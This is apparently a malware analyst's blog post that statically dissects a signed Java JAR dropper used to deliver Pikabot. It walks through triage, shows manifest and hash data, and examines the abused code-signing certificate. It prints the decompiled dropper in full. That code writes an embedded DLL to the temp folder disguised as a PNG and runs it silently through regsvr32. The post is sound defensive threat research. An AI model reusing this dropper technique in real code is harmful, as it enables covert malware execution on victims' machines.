---
layout: post
title: "Dissecting a Java Pikabot Dropper"
date: 2024-03-03
categories: malware
tags: malware pikabot java jar
permalink: /dissecting-java-pikabot-dropper/
---

![Evil Pikachu](/assets/images/dissecting-java-pikabot-dropper/evil_pikachu.png)

In mid-February, TA577 experimented with a Java Archive (JAR) dropper to deliver Pikabot to their victims. In this post I’ll explore some static analysis of that dropper to show how we can get information from it. If you want to follow along, I’m working with this sample in MalwareBazaar: [https://bazaar.abuse.ch/sample/0a0e0d2f9daa0bad25c3defd69a3a6d96a6ac5f325a369761807c06887d3bd9f/](https://bazaar.abuse.ch/sample/0a0e0d2f9daa0bad25c3defd69a3a6d96a6ac5f325a369761807c06887d3bd9f/).

## Triage the JAR

Our first stop is to make sure we do indeed have a JAR file. [Oracle's documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/jarGuide.html) about JAR files states...

> ... It's a file format based on the popular ZIP file format and is used for aggregating many files into one. Although JAR can be used as a general archiving tool, the primary motivation for its development was so that Java applets and their requisite components (.class files, images and sounds) can be downloaded to a browser in a single HTTP transaction, rather than opening a new connection for each piece...

For JAR files, we can expect them to appear similar ZIP archives, and they'll likely hold multiple files within. With this expectation, we can use the `file` tool and 7zip to identify the file and see if it holds contents.

```console
$ file VOLUPTASYK.jar 
VOLUPTASYK.jar: Zip archive data, at least v2.0 to extract

$ 7z l VOLUPTASYK.jar 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 337512 bytes (330 KiB)

Listing archive: VOLUPTASYK.jar

--
Path = VOLUPTASYK.jar
Type = zip
Physical Size = 337512

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-14 12:08:02 .....          336          252  META-INF/MANIFEST.MF
2024-02-14 12:08:02 .....          465          332  META-INF/CERT.SF
2024-02-14 12:08:02 .....         9540         6927  META-INF/CERT.RSA
2024-02-14 14:29:12 D....            0            2  META-INF
2024-02-14 14:29:14 .....         1513          835  kzFRaQVe.class
2024-02-14 14:29:14 .....        10943        10948  x2NqLdqv.gif
2024-02-14 14:29:14 .....       487424       317354  317631
------------------- ----- ------------ ------------  ------------------------
2024-02-14 14:29:14             510221       336650  6 files, 1 folders
```

The output from `file` shows we have something resembling a ZIP file based on file magic bytes, and 7zip shows a file listing inside that is consistent with what I expect for a JAR. The `META-INF` folder is well-documented by Oracle as part of the [JAR specification](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/jar.html#The_META-INF_directory). Here, it appears the files within the JAR were compressed sometime on 2024-02-14.

A couple of files in the listing are potentially interesting to us:

- `kzFRaQVe.class` (A Java class bytecode file)
- `CERT.RSA` (A file containing a code-signing signature)

Now that we know we definitely have a JAR file, we can give decompilation a shot.

## Decompiling the Dropper JAR

In the JAR file listing in 7zip, there is one particular file that contains Java code, `kzFRaQVe.class`. Java class files contain bytecode that can be fairly easily decompiled similarly to .NET Framework code. One of my favorite tools to do so is with `cfr`. This tool is included with REMnux, so it’s easy to try. The tool supports decompiling directly from JAR files, and we can do so here.

```console
$ mkdir decompiled

$ cfr VOLUPTASYK.jar --outputdir ./decompiled/
Processing VOLUPTASYK.jar (use silent to silence)
Processing kzFRaQVe

$ cd decompiled/

$ ls
kzFRaQVe.java  summary.txt
```

Now we successfully have some decompiled Java code! Let's open it up and take a look.

## Static Java Code Analysis

The entirety of the Java code is 21 lines, so it's very brief.

```java
/*
 * Decompiled with CFR 0.149.
 */
import java.io.File;
import java.io.InputStream;
import java.nio.file.CopyOption;
import java.nio.file.Files;

public class kzFRaQVe {
    public static void main(String[] arrstring) {
        try {
            File file = new File(System.getProperty("java.io.tmpdir") + "\\317631.png");
            if (!file.exists()) {
                InputStream inputStream = kzFRaQVe.class.getResourceAsStream("317631");
                Files.copy(inputStream, file.getAbsoluteFile().toPath(), new CopyOption[0]);
            }
            Thread.sleep(1000L);
            Runtime.getRuntime().exec("regsvr32 /s " + System.getProperty("java.io.tmpdir") + "\\317631.png");
        }
        catch (Exception exception) {
            System.out.println("Error!");
        }
    }
}
```
{: file='kzFRaQVe.java'}

The code has a `main()` function, and it's the only Java class in the JAR, so it's a fair bet that this code is the entry point called when a victim opens the JAR. When it executes, it performs a few actions:

- Creates a file at `%TEMP%\317631.png` (example `C:\Users\admin\AppData\Local\Temp\317631.png`)
- Searches for a file in the JAR named `317631` and opens it using [`getResourceAsStream`](https://docs.oracle.com/javase/8/docs/api/java/lang/ClassLoader.html#getResourceAsStream-java.lang.String-)
- Copies the bytes from that file into `317631.png`
- [Sleeps](https://docs.oracle.com/javase/8/docs/api/java/lang/Thread.html#sleep-long-) for 1000 milliseconds (1 second)
- Executes the `317631.png` using `regsvr32.exe`, which indicates the PNG file is likely really a DLL

They were even nice enough to include exception handling!

Before we leave code analysis, it would be nice to confirm that `kzFRaQVe.class/.java` is the entry point for the JAR when clicked. We can confirm that by extracting `META-INF/MANIFEST.MF` from the JAR and inspecting it.

```text
$ cat META-INF/MANIFEST.MF 
Manifest-Version: 1.0
Main-Class: kzFRaQVe
Created-By: 17.0.6 (Oracle Corporation)

Name: kzFRaQVe.class
SHA-256-Digest: VX9uwaDheJmHPaZm1HL+wExnnhepBZ/o8hXG2E+trV8=

Name: x2NqLdqv.gif
SHA-256-Digest: S+ncC/R68x+y08cCuH/N988wJcudS+t5Fqshm3wprnI=

Name: 317631
SHA-256-Digest: qrnj0/kj98F2lN8705WuoREvh+Y1gMF2JXnEMFbTsto=
```

The `Main-Class` entry in the manifest confirms that the JAR will execute the code in `kzFRaQVe.class` when clicked.

From here, we have three leads to check into: examining the `317631` file, examining the `x2NqLdqv.gif` file in the JAR, and examining the signature `META-INF/CERT.RSA`.

## Examining the Pikabot DLL

We can extract `317631` file and see if it is a DLL by using `file` and `diec`.

```console
$ file 317631 
317631: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows

$ diec 317631 
PE32
    Compiler: Microsoft Visual C/C++(19.29.30151)[LTCG/C++]
    Linker: Microsoft Linker(14.29.30151)
    Tool: Visual Studio(2019 version 16.11)
```

We definitely have a C/C++ DLL for Windows posing as that PNG file, so from here I assume the DLL is some form of loader designed to deliver the next stage of Pikabot. If I use my [triage YARA rule](https://forensicitguy.github.io/faster-malware-triage-yara/) to generate all the hashes for me, I can use them to search in [VirusTotal](https://www.virustotal.com/gui/file/aab9e3d3f923f7c17694df3bd395aea1112f87e63580c1762579c43056d3b2da) or other tools for more details.

```console
$ yara ~/yara/triage.yar 317631 
File type:	PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
Mimetype:	application/x-dosexec
MD5:	    f32839de7b3209090778a9a4c5e14cce
SHA-1:	    ca33599617a5de46cb3e726d66eee9d48e5a78af
SHA-256:	aab9e3d3f923f7c17694df3bd395aea1112f87e63580c1762579c43056d3b2da
Imphash:	370ebde54530b2016d14ffc9556403dc
Rich Header Hash:	af6787be711f295a744c1832921c9ab2
```

Based on some [reporting from Elastic](https://www.elastic.co/security-labs/pikabot-i-choose-you) on Pikabot, I'd rather use a sandbox on this sample than perform static analysis. You can see the sandbox reports for this sample by visiting its MalwareBazaar page at the beginning of the post.

## Examining the GIF File

The `x2NqLdqv.gif` file in the JAR stands out to me as a possible way for the adversary to include some legitimate content to inflate the size of the JAR or a way to include extra data. Let's see if it's really a GIF.

```console
$ file x2NqLdqv.gif 
x2NqLdqv.gif: GIF image data, version 87a, 899 x 637

$ diec x2NqLdqv.gif 
Binary
    Image: GIF(87a)[899x637,4bpp]
```

The file appears to have GIF magic bytes, and we can do a cursory look to see if it might include any encrypted content or embedded files. For encryption, we can measure file entropy. For embedded files, we can use the `binwalk` command.

```console
$ diec --entropy x2NqLdqv.gif 
Total 7.96511: packed
  0||0|10943|7.96511: packed

$ binwalk x2NqLdqv.gif 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             GIF image data, version "87a", 899 x 637
```

The entropy is 7.96511, so there is a slight possibility that encrypted data could be within the file, but we also didn't find any references to the file in the decompiled Java code. The `binwalk` command didn't find recognizable files embedded within the GIF file, so that trail ends. I'm inclined to think that the adversary included this file in the JAR as a way to slightly increase the JAR size or to increase the overall entropy of the JAR. Since the Java code didn't reference the GIF, the only way the Pikabot loader could use it would be to reach back and decompress it from the JAR. That path seems unlikely as the loader usually stands alone.

## Examining the Code Signing Signature

This JAR file is signed, and we can examine the signature by extracting the `META-INF/CERT.RSA` file and opening it with `keytool`. There are lots of certificate details included in the output, I've trimmed down the output for brevity here.

```console
$ keytool -printcert -file META-INF/CERT.RSA 

Certificate[1]:
Owner: CN=SSL.com EV Root Certification Authority RSA R2, O=SSL Corporation, L=Houston, ST=Texas, C=US
Issuer: CN=SSL.com EV Root Certification Authority RSA R2, O=SSL Corporation, L=Houston, ST=Texas, C=US
Serial number: 56b629cd34bc78f6
Valid from: Wed May 31 18:14:37 UTC 2017 until: Fri May 30 18:14:37 UTC 2042
Certificate fingerprints:
	 SHA1: 74:3A:F0:52:9B:D0:32:A0:F4:4A:83:CD:D4:BA:A9:7B:7C:2E:C4:9A
	 SHA256: 2E:7B:F1:6C:C2:24:85:A7:BB:E2:AA:86:96:75:07:61:B0:AE:39:BE:3B:2F:E9:D0:CC:6D:4E:F7:34:91:42:5C
Signature algorithm name: SHA256withRSA
Subject Public Key Algorithm: 4096-bit RSA key
Version: 3

...

Certificate[2]:
Owner: OID.1.3.6.1.4.1.311.60.2.1.3=DK, OID.2.5.4.15=Private Organization, CN=Talk Invest ApS, SERIALNUMBER=40777555, O=Talk Invest ApS, L=Tommerup, ST=Region of Southern Denmark, C=DK
Issuer: CN=SSL.com EV Code Signing Intermediate CA RSA R3, O=SSL Corp, L=Houston, ST=Texas, C=US
Serial number: 79695808028c2494541535419610a4e0
Valid from: Fri Jan 19 13:11:25 UTC 2024 until: Sat Jan 18 13:11:25 UTC 2025
Certificate fingerprints:
	 SHA1: 7B:75:39:4F:F0:21:97:A2:1E:6F:68:3A:71:7C:B5:A9:4C:7C:3D:AE
	 SHA256: AE:D1:0C:EE:78:C2:D2:72:6E:CC:B7:3D:9C:24:8F:53:F8:71:85:49:25:18:BD:D0:2C:6D:E9:4B:40:87:36:7D
Signature algorithm name: SHA256withRSA
Subject Public Key Algorithm: 3072-bit RSA key
Version: 3

...
```

The `keytool` utility shows the signing certificate was issued to `Talk Invest ApS` with serial `79695808028c2494541535419610a4e0` by SSL.com. This certificate has already been revoked by the issuer, but if it had not already been revoked we could report these details to SSL.com's abuse support for revocation by showing the certificate was used to sign malware.

That's all the data we can squeeze out of this dropper, thanks for reading!